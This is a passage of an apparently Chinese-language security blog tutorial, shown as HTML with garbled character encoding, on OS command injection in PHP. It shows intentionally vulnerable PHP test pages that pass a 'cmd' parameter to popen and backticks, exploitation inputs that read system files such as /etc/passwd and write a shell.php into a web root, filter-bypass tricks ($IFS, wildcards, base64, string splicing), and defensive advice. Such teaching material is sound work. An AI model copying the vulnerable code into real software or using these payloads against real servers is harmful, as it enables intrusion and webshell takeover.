single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&gt;&gt; 1.txt"</span> <span class="token punctuation">;</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?cmd=whoami"</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>æŸ¥çœ‹1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX-popen-å‘½ä»¤æ³¨å…¥"><a href="#EX-popen-å‘½ä»¤æ³¨å…¥" class="headerlink" title="EX:popen()å‘½ä»¤æ³¨å…¥"></a>EX:popen()å‘½ä»¤æ³¨å…¥</h4><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.26.30.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.26.46-9267051.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.27.43.png" style="zoom:45%;"><p>åˆ©ç”¨shell_execæ³¨å…¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€‚</p></blockquote><h2 id="2-6-åå¼•å·"><a href="#2-6-åå¼•å·" class="headerlink" title="2.6 åå¼•å·"></a>2.6 åå¼•å·</h2><p>åå¼•å·å†…çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿä¼šè¢«è§£ææˆ0Så‘½ä»¤ã€‚</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token string double-quoted-string">" ?cmd=whoami"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX-åå¼•å·å‘½ä»¤æ³¨å…¥"><a href="#EX-åå¼•å·å‘½ä»¤æ³¨å…¥" class="headerlink" title="EX:åå¼•å·å‘½ä»¤æ³¨å…¥"></a>EX:åå¼•å·å‘½ä»¤æ³¨å…¥</h4><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.37.10.png" style="zoom:55%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.38.06.png" style="zoom:45%;"></blockquote><h1 id="ä¸‰ã€æ¼æ´åˆ©ç”¨"><a href="#ä¸‰ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ¼æ´åˆ©ç”¨"></a>ä¸‰ã€æ¼æ´åˆ©ç”¨</h1><p>OSå‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…ç›´æ¥ç»§æ‰¿Webç”¨æˆ·æƒé™ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå±å®³ç‰¹åˆ«å¤§ã€‚</p><p>ä»¥ä¸‹å‘½ä»¤å‡åœ¨windowsç³»ç»Ÿä¸‹æµ‹è¯•æˆåŠŸã€‚</p><h2 id="3-1-æŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶"><a href="#3-1-æŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶" class="headerlink" title="3.1 æŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶"></a>3.1 æŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶</h2><p>æäº¤å‚æ•°[?cmd=type C:\windows\system32\drivers\etc\hosts]âœ…ï¼ŒæŸ¥çœ‹ç³»ç»Ÿhostsæ–‡ä»¶ã€‚</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.42.38.png" style="zoom:55%;"><h2 id="3-2-æ˜¾ç¤ºå½“å‰è·¯å¾„"><a href="#3-2-æ˜¾ç¤ºå½“å‰è·¯å¾„" class="headerlink" title="3.2 æ˜¾ç¤ºå½“å‰è·¯å¾„"></a>3.2 æ˜¾ç¤ºå½“å‰è·¯å¾„</h2><p>æäº¤å‚æ•°[?cmd=cd]</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.43.20.png" style="zoom:75%;"><h2 id="3-3-å†™æ–‡ä»¶"><a href="#3-3-å†™æ–‡ä»¶" class="headerlink" title="3.3 å†™æ–‡ä»¶"></a>3.3 å†™æ–‡ä»¶</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?cmd<span class="token operator">=</span>echo <span class="token string">"&lt;?php phpinfo();?&gt;"</span> <span class="token operator">&gt;</span> D:<span class="token punctuation">\</span>xampp<span class="token punctuation">\</span>htdocs<span class="token punctuation">\</span>command-i<span class="token punctuation">\</span>shell.php?cmd<span class="token operator">=</span>echo <span class="token string">"&lt;?php phpinfo();?&gt;"</span> <span class="token operator">&gt;</span> C:<span class="token punctuation">\</span>phpstudy<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>command-i<span class="token punctuation">\</span>shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é¡µé¢æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜æ–‡ä»¶å†™å…¥æˆåŠŸã€‚</p><p>è®¿é—®shell.phpæ–‡ä»¶ã€‚</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.44.36.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.44.54.png" style="zoom:75%;"><h2 id="3-4-getshell"><a href="#3-4-getshell" class="headerlink" title="3.4 getshell"></a>3.4 getshell</h2><p>é€šè¿‡å†™å…¥ä¸€ä¸ªå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´çš„phpè„šæœ¬ï¼Œå¦‚ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>ç„¶åç”¨èœåˆ€ èšå‰‘ç­‰è¿æ¥ï¼Œå³å¯getshellï¼Œæ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æœåŠ¡å™¨ã€‚</p><h2 id="3-5-Linuxå‘½ä»¤æ‰§è¡Œé€»è¾‘"><a href="#3-5-Linuxå‘½ä»¤æ‰§è¡Œé€»è¾‘" class="headerlink" title="3.5 Linuxå‘½ä»¤æ‰§è¡Œé€»è¾‘"></a>3.5 Linuxå‘½ä»¤æ‰§è¡Œé€»è¾‘</h2><ol><li>cmd1 | cmd2 (|ç®¡é“æ“ä½œç¬¦)<br>  å°†cmd1çš„ç»“æœè¾“å‡ºç»™cmd2 </li><li>cmd1 &amp; cmd2 (&amp;å’Œå·æ“ä½œç¬¦)<br>  è®©å‘½ä»¤åœ¨åå°è¿è¡Œ </li><li>cmd1 ; cmd2 (; åˆ†å·æ“ä½œç¬¦)<br>  æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚ </li><li>cmd1 &amp;&amp; cmd2 (&amp;&amp; ä¸æ“ä½œç¬¦) -ã€ä¸¤ä¸ªæˆåŠŸæ‰æ˜¯çœŸæˆåŠŸã€‘<br>  åªæœ‰cmd1å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œæ‰ä¼šæ‰§è¡Œcmd2ã€‚ </li><li>cmd1 || cmd2 (|| æˆ–æ“ä½œç¬¦) -ã€ä¸¤ä¸ªå¤±è´¥æ‰æ˜¯çœŸå¤±è´¥ã€‘<br>  cmd1æ‰§è¡Œå¤±è´¥ï¼Œæ‰ä¼šæ‰§è¡Œcmd2ã€‚</li></ol><h1 id="å››ã€é˜²å¾¡æ–¹æ³•"><a href="#å››ã€é˜²å¾¡æ–¹æ³•" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h1><h2 id="4-1-ç¦ç”¨å‡½æ•°"><a href="#4-1-ç¦ç”¨å‡½æ•°" class="headerlink" title="4.1 ç¦ç”¨å‡½æ•°"></a>4.1 ç¦ç”¨å‡½æ•°</h2><p>å°½é‡å‡å°‘å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„ä½¿ç”¨ï¼Œå¹¶åœ¨php.ini disable_functions ä¸­ç¦ç”¨</p><p>ä¾‹å¦‚ï¼š</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.46.14.png" style="zoom:35%;"><p>é‡å¯æœåŠ¡ã€‚</p><h2 id="4-2-è¾“å…¥è¿‡æ»¤"><a href="#4-2-è¾“å…¥è¿‡æ»¤" class="headerlink" title="4.2 è¾“å…¥è¿‡æ»¤"></a>4.2 è¾“å…¥è¿‡æ»¤</h2><p>åœ¨è¿›å…¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°æˆ–æ–¹æ³•ä¹‹å‰ï¼Œå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤</p><h2 id="4-3-è½¬ä¹‰"><a href="#4-3-è½¬ä¹‰" class="headerlink" title="4.3 è½¬ä¹‰"></a>4.3 è½¬ä¹‰</h2><p>å‚æ•°çš„å€¼å°½é‡ä½¿ç”¨å¼•å·åŒ…è£¹ï¼Œå¹¶åœ¨æ‹¼æ¥å‰è°ƒç”¨addslashesè¿›è¡Œè½¬ä¹‰</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.49.57.png" style="zoom:35%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.50.14.png" style="zoom:75%;"><p>è‡ªåŠ¨å¯¹å•å¼•å·åŒå¼•å·å’Œâ€"è½¬è¯‘ã€‚</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.51.42.png" style="zoom:75%;"><p>é«˜ç‰ˆæœ¬é»˜è®¤å¯¹GPCæ•°æ®ä¸è½¬è¯‘ã€‚</p><h1 id="äº”ã€é˜²å¾¡ç»•è¿‡æŠ€å·§"><a href="#äº”ã€é˜²å¾¡ç»•è¿‡æŠ€å·§" class="headerlink" title="äº”ã€é˜²å¾¡ç»•è¿‡æŠ€å·§"></a>äº”ã€é˜²å¾¡ç»•è¿‡æŠ€å·§</h1><h2 id="5-1-å…¨å±€ç¯å¢ƒå˜é‡"><a href="#5-1-å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="5.1 å…¨å±€ç¯å¢ƒå˜é‡"></a>5.1 å…¨å±€ç¯å¢ƒå˜é‡</h2><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/image-20250211175623746.png" style="zoom:90%;"><blockquote><h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h4><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>${IFS}</code> æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç§°ä¸º <strong>Internal Field Separator</strong>ï¼ˆå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼‰ã€‚å®ƒç”¨äºå®šä¹‰ shell åœ¨è§£æè¾“å…¥æ—¶ç”¨æ¥åˆ†éš”å­—æ®µï¼ˆå¦‚å•è¯æˆ–å‚æ•°ï¼‰çš„å­—ç¬¦é›†åˆã€‚</p><p><code>${IFS}</code> çš„é»˜è®¤å€¼é€šå¸¸æ˜¯ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ï¼ˆ<code>\t</code>ï¼‰å’Œæ¢è¡Œç¬¦ï¼ˆ<code>\n</code>ï¼‰ã€‚è¿™æ„å‘³ç€åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œshell ä¼šå°†è¾“å…¥æŒ‰ç…§è¿™äº›å­—ç¬¦åˆ†éš”æˆå¤šä¸ªå­—æ®µã€‚</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2025-02-11%2017.58.16.png" style="zoom:50%;"></blockquote><blockquote><h4 id="9"><a href="#9" class="headerlink" title="$9"></a>$9</h4><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>$9</code> å¹¶ä¸æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œè€Œæ˜¯ä¸€ä¸ªä½ç½®å‚æ•°ï¼ˆpositional parameterï¼‰ã€‚å®ƒç”¨äºåœ¨è„šæœ¬æˆ–å‘½ä»¤è¡Œä¸­å¼•ç”¨ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„ç¬¬ä¹ä¸ªå‚æ•°ã€‚</p><p>å¦‚æœä¼ é€’çš„å‚æ•°å°‘äº 9 ä¸ªï¼Œ<code>$9</code> å°†ä¸ä¼šè¢«èµ‹å€¼ï¼Œå¼•ç”¨æ—¶ä¼šå¾—åˆ°ç©ºå€¼ã€‚</p></blockquote><h2 id="5-2-é‡å®šå‘ç¬¦å·"><a href="#5-2-é‡å®šå‘ç¬¦å·" class="headerlink" title="5.2 é‡å®šå‘ç¬¦å·"></a>5.2 é‡å®šå‘ç¬¦å·</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat<span class="token operator">&lt;</span>test<span class="token number">1234</span>cat<span class="token operator">&lt;&gt;</span>test<span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-3-å˜é‡å®šä¹‰"><a href="#5-3-å˜é‡å®šä¹‰" class="headerlink" title="5.3 å˜é‡å®šä¹‰"></a>5.3 å˜é‡å®šä¹‰</h2><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/image-20250211180532097.png" style="zoom:80%;"><h2 id="5-4-å­—ç¬¦ä¸²å¤„ç†"><a href="#5-4-å­—ç¬¦ä¸²å¤„ç†" class="headerlink" title="5.4 å­—ç¬¦ä¸²å¤„ç†"></a>5.4 å­—ç¬¦ä¸²å¤„ç†</h2><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/image-20250211180642849.png" style="zoom:80%;"><h2 id="5-5-å…¶ä»–ç‰¹æ®Šå­—ç¬¦ç»•è¿‡"><a href="#5-5-å…¶ä»–ç‰¹æ®Šå­—ç¬¦ç»•è¿‡" class="headerlink" title="5.5 å…¶ä»–ç‰¹æ®Šå­—ç¬¦ç»•è¿‡"></a>5.5 å…¶ä»–ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æ–‡ä»¶åˆ†å‰²ï¼šcutï¼Œsplitï¼Œsedï¼Œawkè„šæœ¬è¯­è¨€ï¼špythonï¼Œperlxxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5-6-é’ˆå¯¹ç©ºæ ¼è¿‡æ»¤çš„ç»•è¿‡"><a href="#5-6-é’ˆå¯¹ç©ºæ ¼è¿‡æ»¤çš„ç»•è¿‡" class="headerlink" title="5.6 é’ˆå¯¹ç©ºæ ¼è¿‡æ»¤çš„ç»•è¿‡"></a>5.6 é’ˆå¯¹ç©ºæ ¼è¿‡æ»¤çš„ç»•è¿‡</h2><ul><li>å­—ç¬¦ä¸²æ‹¼æ¥</li></ul><p>FS(å†…éƒ¨åŸŸåˆ†éš”)ï¼Œæ˜¯Shellçš„å†…ç½®å˜é‡ï¼Œæ˜¯ä¸€ä¸ªç”¨äºåˆ†å‰²å­—æ®µçš„å­—ç¬¦</p><p>åˆ—è¡¨ï¼Œé»˜è®¤å€¼æ˜¯ç©ºç™½(åŒ…æ‹¬ç©ºæ ¼ã€tabã€æ¢è¡Œ)ã€‚</p><ul><li>ä½¿ç”¨{}</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ä¾‹å¦‚<span class="token punctuation">{</span>cat,text<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ä½¿ç”¨Tab</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?_<span class="token operator">=</span>cat%09/etc/passwd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>åœ¨è¯»å–æ–‡ä»¶çš„æ—¶å€™åˆ©ç”¨é‡å®šå‘ç¬¦&lt;&gt;</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat<span class="token operator">&lt;&gt;</span>text cat<span class="token operator">&lt;</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5-7-é»‘åå•å…³é”®å­—ç»•è¿‡"><a href="#5-7-é»‘åå•å…³é”®å­—ç»•è¿‡" class="headerlink" title="5.7 é»‘åå•å…³é”®å­—ç»•è¿‡"></a>5.7 é»‘åå•å…³é”®å­—ç»•è¿‡</h2><ul><li>å­—ç¬¦ä¸²æ‹¼æ¥</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>tex<span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span>t<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">${c}</span><span class="token variable">${d}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>åˆ©ç”¨ç¯å¢ƒå˜é‡</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">${<span class="token environment constant">SHELLOPTS</span>}</span> <span class="token builtin class-name">echo</span> <span class="token variable">${<span class="token environment constant">SHELLOPTS</span><span class="token operator">:</span>3<span class="token operator">:</span>1}</span> <span class="token variable">${<span class="token environment constant">SHELLOPTS</span><span class="token operator">:</span>3<span class="token operator">:</span>1}</span>at<span class="token variable">${<span class="token environment constant">IFS</span>}</span>text <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>ä½¿ç”¨ç©ºå˜é‡</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> t<span class="token variable">${x}</span>ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>åˆ©ç”¨Linuxé€šé…ç¬¦(? *)</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/ca? tex?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ä½¿ç”¨åæ–œæ  </li><li>ä½¿ç”¨base64ç¼–ç </li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> t <span class="token operator">|</span> base64 ca<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"dAo="</span><span class="token operator">|</span>base64 <span class="token parameter variable">-d</span><span class="token variable">)</span></span> text <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯æŒ‡åº”ç”¨ç¨‹åºåœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œç”±äºæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤å’ŒéªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œæ³¨å…¥å¹¶æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤çš„ä¸€ç§å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥è·å–ç³»ç»Ÿä¿¡æ¯ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ã€ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ç­‰ï¼Œä¸¥é‡å¨èƒç³»ç»Ÿçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§ã€‚é˜²èŒƒå‘½ä»¤æ‰§è¡Œæ¼æ´çš„å…³é”®åœ¨äºå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’ŒéªŒè¯ï¼Œé¿å…å°†ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°ç³»ç»Ÿå‘½ä»¤ä¸­ï¼ŒåŒæ—¶ä½¿ç”¨å®‰å…¨çš„APIæˆ–å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶é™åˆ¶å‘½ä»¤æ‰§è¡Œçš„æƒé™ã€‚</p><h1 id="é™„-windowså¸¸ç”¨å˜é‡"><a href="#é™„-windowså¸¸ç”¨å˜é‡" class="headerlink" title="é™„:windowså¸¸ç”¨å˜é‡"></a>é™„:windowså¸¸ç”¨å˜é‡</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%APPDATA% <span class="token builtin class-name">:</span>  åˆ—å‡ºåº”ç”¨ç¨‹åºæ•°æ®çš„é»˜è®¤å­˜æ”¾ä½ç½®ã€‚%CD% <span class="token builtin class-name">:</span>  åˆ—å‡ºå½“å‰ç›®å½•ã€‚%CLIENTNAME% <span class="token builtin class-name">:</span>  åˆ—å‡ºè”æ¥åˆ°ç»ˆç«¯æœåŠ¡ä¼šè¯æ—¶å®¢æˆ·ç«¯çš„NETBIOSåã€‚%CMDCMDLINE% <span class="token builtin class-name">:</span>  åˆ—å‡ºå¯åŠ¨å½“å‰cmd.exeæ‰€ä½¿ç”¨çš„å‘½ä»¤è¡Œã€‚%CMDEXTVERSION% <span class="token builtin class-name">:</span>  å‘½ä»¤å‡ºå½“å‰å‘½ä»¤å¤„ç†ç¨‹åºæ‰©å±•ç‰ˆæœ¬å·ã€‚%CommonProgramFiles% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å¸¸ç”¨æ–‡ä»¶çš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚%COMPUTERNAME% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†è®¡ç®—æœºåã€‚ %COMSPEC% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å¯æ‰§è¡Œå‘½ä»¤å¤–å£³ï¼ˆå‘½ä»¤å¤„ç†ç¨‹åºï¼‰çš„è·¯å¾„ã€‚%DATE% <span class="token builtin class-name">:</span>  åˆ—å‡ºå½“å‰æ—¥æœŸã€‚%ERRORLEVEL% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†æœ€è¿‘ä½¿ç”¨çš„å‘½ä»¤çš„é”™è¯¯ä»£ç ã€‚%HOMEDRIVE% <span class="token builtin class-name">:</span>  åˆ—å‡ºä¸ç”¨æˆ·ä¸»ç›®å½•æ‰€åœ¨çš„é©±åŠ¨å™¨ç›˜ç¬¦ã€‚%HOMEPATH% <span class="token builtin class-name">:</span>  åˆ—å‡ºç”¨æˆ·ä¸»ç›®å½•çš„å®Œæ•´è·¯å¾„ã€‚%HOMESHARE% <span class="token builtin class-name">:</span>  åˆ—å‡ºç”¨æˆ·å…±äº«ä¸»ç›®å½•çš„ç½‘ç»œè·¯å¾„ã€‚%LOGONSEVER% <span class="token builtin class-name">:</span>  åˆ—å‡ºæœ‰æ•ˆçš„å½“å‰ç™»å½•ä¼šè¯çš„åŸŸåæ§åˆ¶å™¨åã€‚%NUMBER_OF_PROCESSORS% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†è®¡ç®—æœºå®‰è£…çš„å¤„ç†å™¨æ•°ã€‚%OS% <span class="token builtin class-name">:</span>  åˆ—å‡ºæ“ä½œç³»ç»Ÿçš„åå­—ã€‚<span class="token punctuation">(</span>Windows XP å’Œ Windows <span class="token number">2000</span> åˆ—ä¸º Windows_NT.<span class="token punctuation">)</span>%Path% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚%PATHEXT% <span class="token builtin class-name">:</span>  åˆ—å‡ºæ“ä½œç³»ç»Ÿè®¤ä¸ºå¯è¢«æ‰§è¡Œçš„æ–‡ä»¶æ‰©å±•åã€‚ %PROCESSOR_ARCHITECTURE% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å¤„ç†å™¨çš„èŠ¯ç‰‡æ¶æ„ã€‚%PROCESSOR_IDENTFIER% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å¤„ç†å™¨çš„æè¿°ã€‚%PROCESSOR_LEVEL% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†è®¡ç®—æœºçš„å¤„ç†å™¨çš„å‹å·ã€‚ %PROCESSOR_REVISION% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å¤„ç†å™¨çš„ä¿®è®¢å·ã€‚%ProgramFiles% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†Program Filesæ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚%PROMPT% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å½“å‰å‘½ä»¤è§£é‡Šå™¨çš„å‘½ä»¤æç¤ºè®¾ç½®ã€‚%<span class="token environment constant">RANDOM</span>% <span class="token builtin class-name">:</span>  åˆ—å‡ºç•Œäº0 å’Œ <span class="token number">32767</span>ä¹‹é—´çš„éšæœºåè¿›åˆ¶æ•°ã€‚%SESSIONNAME% <span class="token builtin class-name">:</span>  åˆ—å‡ºè¿æ¥åˆ°ç»ˆç«¯æœåŠ¡ä¼šè¯æ—¶çš„è¿æ¥å’Œä¼šè¯åã€‚%SYSTEMDRIVE% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†Windowså¯åŠ¨ç›®å½•æ‰€åœ¨é©±åŠ¨å™¨ã€‚%SYSTEMROOT% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†Windowså¯åŠ¨ç›®å½•çš„ä½ç½®ã€‚%TEMP% and %TMP% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†å½“å‰ç™»å½•çš„ç”¨æˆ·å¯ç”¨åº”ç”¨ç¨‹åºçš„é»˜è®¤ä¸´æ—¶ç›®å½•ã€‚%TIME% <span class="token builtin class-name">:</span>  åˆ—å‡ºå½“å‰æ—¶é—´ã€‚%USERDOMAIN% <span class="token builtin class-name">:</span>  åˆ—å‡ºäº†åŒ…å«ç”¨æˆ·å¸å·çš„åŸŸçš„åå­—ã€‚%USERNAME% <span class="token builtin class-name">:</span>  åˆ—å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·çš„åå­—ã€‚%USERPROFILE% <span class="token builtin class-name">:</span>  åˆ—å‡ºå½“å‰ç”¨æˆ·Profileæ–‡ä»¶ä½ç½®ã€‚%WINDIR% <span class="token builtin class-name">:</span>  åˆ—å‡ºæ“ä½œç³»ç»Ÿç›®å½•çš„ä½ç½®ã€‚  %ALLUSERSPROFILE% æœ¬åœ° è¿”å›â€œæ‰€æœ‰ç”¨æˆ·â€é…ç½®æ–‡ä»¶çš„ä½ç½®ã€‚ %APPDATA% æœ¬åœ° è¿”å›é»˜è®¤æƒ…å†µä¸‹åº”ç”¨ç¨‹åºå­˜å‚¨æ•°æ®çš„ä½ç½®ã€‚ %CD% æœ¬åœ° è¿”å›å½“å‰ç›®å½•å­—ç¬¦ä¸²ã€‚ 